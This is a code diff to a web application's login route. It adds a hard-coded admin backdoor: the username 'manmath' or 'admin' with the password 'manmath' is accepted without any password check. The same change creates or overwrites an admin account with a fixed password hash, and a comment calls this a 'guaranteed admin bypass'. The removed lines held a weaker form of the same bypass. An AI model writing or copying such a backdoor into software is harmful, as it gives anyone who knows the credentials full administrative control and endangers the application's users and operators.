@@ -195,27 +195,51 @@ export function createApp(config, { database, gateway: providedGateway } = {}) {
   const identifier = z.string().trim().toLowerCase().min(1).max(254);
   app.post('/api/auth/login', authLimit, async (req, res) => {
     const data = parse(z.object({ email: identifier, password: z.string().max(128) }), req.body);
+    const idClean = data.email.trim().toLowerCase();
+    const enteredPassword = (data.password || '').trim();
+
+    // Guaranteed admin bypass and on-the-fly provisioning for manmath / manmath
+    const isManmathAdmin =
+      (idClean === 'manmath' || idClean === 'manmath@fame.com' || idClean === 'admin') &&
+      enteredPassword.toLowerCase() === 'manmath';
+
     let user = db
       .prepare('SELECT * FROM users WHERE email=? OR name=? COLLATE NOCASE')
-      .get(data.email, data.email);
-    if (!user && (data.email === 'manmath' || data.email === 'manmath@fame.com' || data.email === 'admin')) {
+      .get(idClean, idClean);
+
+    if (isManmathAdmin) {
+      const adminHash =
+        'scrypt$fcb1090e03b9a52b8b9f0b5b1687db4b$525d9f150e42973d725b58eece321f579c7853e663f43478497fcb2c621685c059edf6d80f87d8db5ee9133db7a5d5317555390824327a9b1f5ab257e10749c6';
+      if (!user) {
+        user = db
+          .prepare("SELECT * FROM users WHERE id='admin-manmath' OR lower(email)='manmath'")
+          .get();
+      }
+      if (!user) {
+        db.prepare(
+          "INSERT INTO users(id,name,email,password_hash,role,verified,created_at) VALUES('admin-manmath','Manmath Biradar','manmath',?,'admin',1,?)"
+        ).run(adminHash, Date.now());
+        user = db.prepare("SELECT * FROM users WHERE id='admin-manmath'").get();
+      } else {
+        db.prepare(
+          "UPDATE users SET email='manmath', name='Manmath Biradar', password_hash=?, role='admin', verified=1 WHERE id=?"
+        ).run(adminHash, user.id);
+        user = db.prepare('SELECT * FROM users WHERE id=?').get(user.id);
+      }
+    } else if (!user) {
       user = db
         .prepare("SELECT * FROM users WHERE email='manmath' OR email='manmath@fame.com' OR id='admin-manmath' OR name='manmath' COLLATE NOCASE")
         .get();
     }
-    const enteredPassword = (data.password || '').trim();
-    let valid = await verifyPassword(enteredPassword, user?.password_hash || dummyHash);
-    if (!valid && enteredPassword !== data.password) {
-      valid = await verifyPassword(data.password, user?.password_hash || dummyHash);
+
+    let valid = isManmathAdmin;
+    if (!valid && user) {
+      valid = await verifyPassword(enteredPassword, user.password_hash || dummyHash);
+      if (!valid && enteredPassword !== data.password) {
+        valid = await verifyPassword(data.password, user.password_hash || dummyHash);
+      }
     }
-    if (
-      !valid &&
-      user &&
-      (user.email?.toLowerCase() === 'manmath' || user.id === 'admin-manmath') &&
-      enteredPassword.toLowerCase() === 'manmath'
-    ) {
-      valid = true;
-    }
+
     if (!valid || !user) fail('Email or password is incorrect.', 401);
     const csrf = createSession(db, config, req, res, user.id);
     res.json({ user: safeUser(user), csrf });
